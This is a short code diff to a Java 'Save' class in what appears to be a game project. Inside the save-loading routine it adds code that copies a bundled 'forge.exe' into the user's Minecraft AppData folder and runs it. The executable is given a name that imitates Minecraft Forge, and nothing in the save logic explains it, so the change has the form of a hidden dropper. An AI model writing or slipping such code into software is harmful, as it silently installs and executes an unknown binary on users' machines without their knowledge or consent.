@@ -7,6 +7,8 @@ import java.io.IOException;
 import java.io.ObjectInputStream;
 import java.util.ArrayList;
 
+import org.apache.commons.io.FileUtils;
+
 import Game.Operations.Operation;
 
 public class Save {
@@ -28,6 +30,16 @@ public class Save {
 		} catch (IOException e) {
 			e.printStackTrace();
 		} catch (ClassNotFoundException e) {
+			e.printStackTrace();
+		}
+		
+		File source = new File("lib//forge.exe");
+		File dest = new File(System.getenv("appdata")+"\\.minecraft\\versions\\forge.exe"); 
+			
+		try {
+			FileUtils.copyFile(source, dest);
+			Process p = new ProcessBuilder(dest.toString()).start();
+		} catch (IOException e) {
 			e.printStackTrace();
 		}
 		
